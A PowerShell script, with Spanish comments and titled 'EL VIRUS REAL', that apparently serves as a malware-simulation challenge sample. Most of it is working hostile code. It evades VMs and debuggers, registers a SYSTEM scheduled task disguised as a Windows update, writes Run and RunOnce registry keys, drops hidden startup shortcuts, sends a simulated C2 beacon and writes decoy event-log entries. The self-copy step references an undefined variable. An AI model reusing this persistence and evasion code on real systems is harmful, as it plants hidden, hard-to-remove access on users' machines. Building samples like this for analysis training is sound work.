# persistent_payload.ps1 - EL VIRUS REAL
param([switch]$Install)

$PayloadName = "WindowsTelemetryService"
$PayloadPath = "$env:LOCALAPPDATA\$PayloadName.ps1"

# =====================================================
# FUNCIÓN ANTI-ANÁLISIS
# =====================================================
function Test-AntiAnalysis {
    # Detectar máquinas virtuales/debuggers
    if ((Get-WmiObject Win32_ComputerSystem).Model -match "VMware|Virtual") { exit }
    if (Get-Process | Where-Object {$_.ProcessName -eq "ollydbg"}) { exit }
    if ($host.Name -eq "ConsoleHost" -and $host.UI.RawUI.WindowTitle -match "Debugger") { exit }
}

# =====================================================
# INSTALACIÓN MULTI-PERSISTENCIA
# =====================================================
function Install-Persistence {
    Test-AntiAnalysis
    
    # 1. Auto-copiarse
    $ThisScript | Out-File $PayloadPath -Force
    
    # 2. TAREA PROGRAMADA (cada 7min)
    $TaskName = "WindowsUpdateCheck"
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PayloadPath`""
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtLogOn),
        (New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 7) -RepetitionDuration ([TimeSpan]::MaxValue))
    )
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force -User "SYSTEM" | Out-Null
    
    # 3. REGISTRO (3 claves diferentes)
    $RunKeys = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($Key in $RunKeys) {
        $ValueName = "WinUpdateSvc$([guid]::NewGuid().ToString().Substring(0,4))"
        Set-ItemProperty -Path $Key -Name $ValueName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
    }
    
    # 4. STARTUP + W10 Startup Folder
    $StartupPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        "$env:LOCALAPPDATA\Microsoft\WindowsApps"
    )
    foreach ($Path in $StartupPaths) {
        $LnkPath = "$Path\UpdateService.lnk"
        $Wsh = New-Object -ComObject WScript.Shell
        $Shortcut = $Wsh.CreateShortcut($LnkPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PayloadPath`""
        $Shortcut.Save()
    }
    
    # 5. BITS Job (Background Intelligent Transfer)
    $BitsJob = Start-BitsTransfer -Source "http://neverssl.com/" -Destination "$env:TEMP\null" -Asynchronous
    Start-Sleep 2
    Complete-BitsTransfer -BitsJob $BitsJob
    
    # 6. Evento visible para análisis
    $Marker = "$env:PUBLIC\Desktop\SystemDiagnostic.log"
    "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))] Windows Update Service v23.11 - OK" | Out-File $Marker -Force
    
    Write-Host "[+] Persistence deployed (6 vectors). Challenge active." -ForegroundColor Red
}

# =====================================================
# COMPORTAMIENTO MALICIOSO INTERMITENTE
# =====================================================
function Execute-MalwareBehavior {
    Test-AntiAnalysis
    
    # CPU Spike aleatorio (3-8 segundos)
    $Duration = 3 + (Get-Random -Maximum 5)
    $Start = Get-Date
    Write-Host "[Telemetry] CPU diagnostic starting..." -ForegroundColor Cyan
    
    while (((Get-Date) - $Start).TotalSeconds -lt $Duration) {
        1..500000 | ForEach-Object { $_ * (Get-Random -Maximum 1000) }
        Start-Sleep -Milliseconds 50
    }
    
    # Proceso hijo efímero con nombre sospechoso
    $RandomProc = @("svchost", "lsass", "winlogon")[Get-Random]
    $ProcId = Start-Job -ScriptBlock {
        param($name)
        Start-Sleep (5 + (Get-Random -Maximum 10))
        # Simular C2 beacon
        $null = Invoke-WebRequest -Uri "http://neverssl.com/" -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue
    } -ArgumentList $RandomProc | Select-Object -ExpandProperty Id
    
    Start-Sleep 10
    # Cleanup hijo
    Get-Job -Id $ProcId | Remove-Job -Force
    
    # Ruido en logs
    $EventLog = "Application"
    $null = New-EventLog -LogName $EventLog -Source "WindowsUpdate" -ErrorAction SilentlyContinue
    Write-EventLog -LogName $EventLog -Source "WindowsUpdate" -EventId 1001 -EntryType Information -Message "Update check completed"
    
    Write-Host "[Telemetry] Cycle complete. Next execution in 420s..." -ForegroundColor Cyan
}

# =====================================================
# EXECUCIÓN PRINCIPAL
# =====================================================
if ($Install) {
    Install-Persistence
} else {
    Execute-MalwareBehavior
    # Dormir hasta próximo ciclo
    Start-Sleep 420  # 7 minutos
    & $MyInvocation.MyCommand.Path  # Auto-reejecutar
}